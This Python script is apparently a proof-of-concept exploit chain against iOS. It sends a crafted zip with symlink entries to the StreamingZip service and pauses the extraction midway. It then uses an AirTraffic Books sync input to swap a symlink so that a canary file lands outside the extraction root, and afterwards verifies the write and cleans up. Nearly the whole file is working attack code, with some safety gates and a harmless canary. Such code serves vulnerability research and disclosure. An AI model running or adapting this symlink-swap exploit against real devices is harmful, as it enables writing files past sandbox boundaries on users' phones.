#!/usr/bin/env python3
"""Reversible Media-only StreamingZip/AirTraffic symlink-swap canary."""

from __future__ import annotations

import argparse
import asyncio
import hashlib
import io
import json
import logging
import os
import plistlib
import secrets
import stat
import sys
import zipfile
from contextlib import suppress
from pathlib import Path
from typing import Any

from pymobiledevice3.services.afc import AfcService

import chain_canary as chain


CANARY_NAME = "canary-24A435.txt"
CANARY_BYTES = b"codex-streamingzip-airtraffic-swap-canary-24A435\n"
RUN_ROOT = Path(__file__).resolve().parent / "run" / "streamingzip-airtraffic-swap"


def build_archive(destination: str) -> tuple[bytes, bytes, dict[str, Any]]:
    """Put the payload local header wholly in the resumable suffix."""
    link_target = "inside"
    replacement_target = f"../{destination}"
    metadata = plistlib.dumps(
        {"Version": 2}, fmt=plistlib.FMT_BINARY, sort_keys=True
    )
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", allowZip64=False) as archive:
        archive.writestr(chain.zip_info("META-INF/", stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            chain.zip_info(
                "META-INF/com.apple.ZipMetadata.plist", stat.S_IFREG | 0o600
            ),
            metadata,
        )
        archive.writestr(chain.zip_info("inside/", stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            chain.zip_info(f"{destination}/", stat.S_IFDIR | 0o755), b""
        )
        archive.writestr(chain.zip_info("deep/", stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            chain.zip_info("link", stat.S_IFLNK | 0o777), link_target.encode()
        )
        archive.writestr(
            chain.zip_info("deep/replacement", stat.S_IFLNK | 0o777),
            replacement_target.encode(),
        )
        # Parsing this look-ahead header commits both symlinks before the host
        # supplies any byte of the payload local header.
        archive.writestr(chain.zip_info("barrier/", stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            chain.zip_info(f"link/{CANARY_NAME}", stat.S_IFREG | 0o600),
            CANARY_BYTES,
        )

    blob = output.getvalue()
    with zipfile.ZipFile(io.BytesIO(blob)) as parsed:
        payload = next(
            item
            for item in parsed.infolist()
            if item.filename == f"link/{CANARY_NAME}"
        )
        split = payload.header_offset
        entries = [item.filename for item in parsed.infolist()]
    if split <= 0 or split >= len(blob):
        raise RuntimeError("archive split safety gate rejected")
    return blob[:split], blob[split:], {
        "linkTarget": link_target,
        "replacementTarget": replacement_target,
        "swappedTarget": f"../{destination}",
        "entries": entries,
        "archiveLength": len(blob),
        "prefixLength": split,
        "suffixLength": len(blob) - split,
        "archiveSHA256": hashlib.sha256(blob).hexdigest(),
    }


async def exact_remove(afc: AfcService, paths: list[str]) -> list[str]:
    failures: list[str] = []
    for path in paths:
        try:
            if await afc.exists(path) and not await afc.rm_single(path, force=True):
                failures.append(path)
        except Exception as error:
            failures.append(f"{path}:{type(error).__name__}")
    return failures


async def cleanup_generated(
    afc: AfcService,
    source: str,
    destination: str,
    recovered: str,
) -> list[str]:
    # Unlink all generated symlinks first so no later cleanup path traverses
    # through one of them.
    symlinks = [
        f"{source}/link",
        f"{source}/deep/replacement",
        recovered,
    ]
    ordinary = [
        f"{destination}/{CANARY_NAME}",
        f"{source}/inside/{CANARY_NAME}",
        f"{source}/{destination}/{CANARY_NAME}",
        f"{source}/barrier/{CANARY_NAME}",
        f"{source}/deep",
        f"{source}/barrier",
        f"{source}/inside",
        f"{source}/{destination}",
        f"{source}/META-INF/com.apple.ZipMetadata.plist",
        f"{source}/META-INF",
        source,
        destination,
    ]
    return await exact_remove(afc, symlinks) + await exact_remove(afc, ordinary)


async def start_stream(provider):
    for service_name in (chain.SERVICE, f"{chain.SERVICE}.shim.remote"):
        try:
            return service_name, await provider.start_lockdown_service(service_name)
        except Exception:
            continue
    raise RuntimeError("streaming zip conduit is unavailable")


async def wait_for_paused_state(
    afc: AfcService,
    source: str,
    destination: str,
    expected_link: str,
    expected_replacement: str,
) -> dict[str, Any]:
    for attempt in range(240):
        required = (
            f"{source}/link",
            f"{source}/deep/replacement",
            f"{source}/inside",
            f"{source}/{destination}",
        )
        if all([await afc.exists(path) for path in required]):
            link = await afc.stat(f"{source}/link")
            replacement = await afc.stat(f"{source}/deep/replacement")
            if (
                link.get("st_ifmt") == "S_IFLNK"
                and link.get("LinkTarget") == expected_link
                and replacement.get("st_ifmt") == "S_IFLNK"
                and replacement.get("LinkTarget") == expected_replacement
            ):
                return {
                    "attempt": attempt + 1,
                    "link": link,
                    "replacement": replacement,
                }
        await asyncio.sleep(0.025)
    raise RuntimeError("paused extractor state did not materialize")


async def observe_file(afc: AfcService, path: str) -> dict[str, Any]:
    present = await afc.exists(path)
    result: dict[str, Any] = {"path": path, "present": present}
    if present:
        data = await afc.get_file_contents(path)
        result.update(
            {
                "length": len(data),
                "sha256": hashlib.sha256(data).hexdigest(),
                "contentMatched": data == CANARY_BYTES,
            }
        )
    return result


async def run_canary() -> tuple[int, dict[str, Any]]:
    token = secrets.token_hex(8)
    source = f"codex-sz-atc-src-24A435-{token}"
    destination = f"codex-sz-atc-dst-24A435-{token}"
    recovered = f"codex-sz-atc-recovered-24A435-{token}"
    prefix, suffix, archive_info = build_archive(destination)
    link_identifier = f"../../{source}/link"
    replacement_identifier = f"../../{source}/deep/replacement"
    books = chain.build_books_plist(link_identifier, replacement_identifier)
    report: dict[str, Any] = {
        "schema": 1,
        "test": "StreamingZipAirTrafficPausedSymlinkSwap",
        "scope": "/var/mobile/Media only",
        "mobileGestaltTouched": False,
        "token": token,
        "source": source,
        "destination": destination,
        "recoveredOriginalLink": recovered,
        "archive": archive_info,
        "booksSHA256": hashlib.sha256(books).hexdigest(),
        "canarySHA256": hashlib.sha256(CANARY_BYTES).hexdigest(),
        "airTrafficMoves": [
            {"identifier": link_identifier, "destination": recovered},
            {
                "identifier": replacement_identifier,
                "destination": f"{source}/link",
            },
        ],
    }
    snapshot: dict[str, Any] | None = None
    cleanup_armed = False
    cleanup_failures: list[str] = []
    connection = None
    try:
        async with chain.paired_wifi_provider(report) as provider:
            observed = (
                provider.product_type,
                provider.product_version,
                provider.product_build_version,
            )
            if observed != (
                chain.EXPECTED_PRODUCT,
                chain.EXPECTED_VERSION,
                chain.EXPECTED_BUILD,
            ):
                raise RuntimeError(f"device/build safety gate rejected {observed!r}")
            report["device"] = {
                "productType": observed[0],
                "productVersion": observed[1],
                "build": observed[2],
            }
            async with AfcService(provider) as afc:
                snapshot = await chain.take_books_snapshot(afc)
                report["booksPreimage"] = chain.public_snapshot(snapshot)
                fresh = {
                    source: not await afc.exists(source),
                    destination: not await afc.exists(destination),
                    recovered: not await afc.exists(recovered),
                }
                report["freshPathGate"] = fresh
                if not all(fresh.values()):
                    raise RuntimeError("fresh-path safety gate failed")
                if snapshot["files"]["Books/Sync/Books.plist"]["exists"]:
                    raise RuntimeError("fixed Books sync input is already present")

                cleanup_armed = True
                await afc.makedirs(destination)
                service_name, connection = await start_stream(provider)
                report["serviceName"] = service_name
                await connection.send_plist({"MediaSubdir": source})
                await connection.sendall(prefix)

                paused = await wait_for_paused_state(
                    afc,
                    source,
                    destination,
                    archive_info["linkTarget"],
                    archive_info["replacementTarget"],
                )
                report["pausedState"] = {
                    "attempt": paused["attempt"],
                    "linkType": paused["link"].get("st_ifmt"),
                    "linkTarget": paused["link"].get("LinkTarget"),
                    "replacementType": paused["replacement"].get("st_ifmt"),
                    "replacementTarget": paused["replacement"].get("LinkTarget"),
                }

                await afc.makedirs("Books/Sync")
                await afc.set_file_contents("Books/Sync/Books.plist", books)
                udid = chain.TRANSPORT.paired_coredevice_udid()
                report["airTraffic"] = await asyncio.to_thread(
                    chain.run_atc_host,
                    udid,
                    link_identifier,
                    recovered,
                    replacement_identifier,
                    f"{source}/link",
                )

                replacement_now = await afc.stat(f"{source}/link")
                recovered_now = await afc.stat(recovered)
                report["postSwapState"] = {
                    "replacement": {
                        "type": replacement_now.get("st_ifmt"),
                        "target": replacement_now.get("LinkTarget"),
                    },
                    "recovered": {
                        "type": recovered_now.get("st_ifmt"),
                        "target": recovered_now.get("LinkTarget"),
                    },
                    "deepReplacementAbsent": not await afc.exists(
                        f"{source}/deep/replacement"
                    ),
                }
                report["swapVerified"] = bool(
                    report["airTraffic"].get("ok")
                    and replacement_now.get("st_ifmt") == "S_IFLNK"
                    and replacement_now.get("LinkTarget")
                    == archive_info["swappedTarget"]
                    and recovered_now.get("st_ifmt") == "S_IFLNK"
                    and recovered_now.get("LinkTarget") == archive_info["linkTarget"]
                    and report["postSwapState"]["deepReplacementAbsent"]
                )
                if not report["swapVerified"]:
                    raise RuntimeError("AirTraffic symlink swap was not verified")

                await connection.sendall(suffix)
                try:
                    response = await asyncio.wait_for(connection.recv_plist(), timeout=30)
                    report["serviceResponse"] = chain.TRANSPORT.json_safe(response)
                except asyncio.TimeoutError:
                    report["serviceResponse"] = {"timeout": True}
                finally:
                    await connection.close()
                    connection = None

                report["observations"] = {
                    "outsideExtractionRoot": await observe_file(
                        afc, f"{destination}/{CANARY_NAME}"
                    ),
                    "originalInsideTarget": await observe_file(
                        afc, f"{source}/inside/{CANARY_NAME}"
                    ),
                    "inRootReplacementTarget": await observe_file(
                        afc, f"{source}/{destination}/{CANARY_NAME}"
                    ),
                }
    except Exception as error:
        report["errorType"] = type(error).__name__
        report["error"] = chain.TRANSPORT.redact(error)
    finally:
        if connection is not None:
            with suppress(Exception):
                await connection.close()

    # Use a fresh connection for cleanup so it still runs if the conduit or
    # first lockdown session failed while paused.
    if cleanup_armed:
        try:
            cleanup_transport: dict[str, Any] = {}
            async with chain.paired_wifi_provider(cleanup_transport) as provider:
                async with AfcService(provider) as afc:
                    cleanup_failures.extend(
                        await cleanup_generated(afc, source, destination, recovered)
                    )
                    if snapshot is not None:
                        cleanup_failures.extend(
                            await chain.restore_books_snapshot(afc, snapshot)
                        )
                    report["cleanup"] = {
                        "failures": cleanup_failures,
                        "sourceAbsent": not await afc.exists(source),
                        "destinationAbsent": not await afc.exists(destination),
                        "recoveredAbsent": not await afc.exists(recovered),
                        "booksRestored": not cleanup_failures,
                    }
        except Exception as error:
            cleanup_failures.append(f"cleanup:{type(error).__name__}")
            report["cleanup"] = {"failures": cleanup_failures}
    else:
        report["cleanup"] = {"skipped": "fresh-path gate did not arm cleanup"}

    outside = report.get("observations", {}).get("outsideExtractionRoot", {})
    cleanup = report.get("cleanup", {})
    confirmed = bool(
        report.get("swapVerified")
        and outside.get("present")
        and outside.get("contentMatched")
        and cleanup.get("sourceAbsent")
        and cleanup.get("destinationAbsent")
        and cleanup.get("recoveredAbsent")
        and not cleanup.get("failures")
    )
    report["outcome"] = "confirmed" if confirmed else "not-confirmed"
    run_directory = RUN_ROOT / token
    run_directory.mkdir(parents=True, exist_ok=False)
    report_path = run_directory / "streamingzip-airtraffic-swap-canary.json"
    report["reportPath"] = os.fspath(report_path)
    report_path.write_text(json.dumps(report, indent=2, sort_keys=True) + "\n")
    return (0 if confirmed else 2), report


def dry_run() -> dict[str, Any]:
    destination = "codex-sz-atc-dst-24A435-dryrun"
    prefix, suffix, info = build_archive(destination)
    return {
        "dryRun": True,
        "scope": "/var/mobile/Media only",
        "mobileGestaltTouched": False,
        "archive": info,
        "prefixSHA256": hashlib.sha256(prefix).hexdigest(),
        "suffixSHA256": hashlib.sha256(suffix).hexdigest(),
    }


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--run", action="store_true")
    args = parser.parse_args()
    logging.disable(logging.CRITICAL)
    if not args.run:
        print(json.dumps(dry_run(), indent=2, sort_keys=True))
        return 0
    code, report = asyncio.run(run_canary())
    print(json.dumps(report, indent=2, sort_keys=True))
    return code


if __name__ == "__main__":
    sys.exit(main())
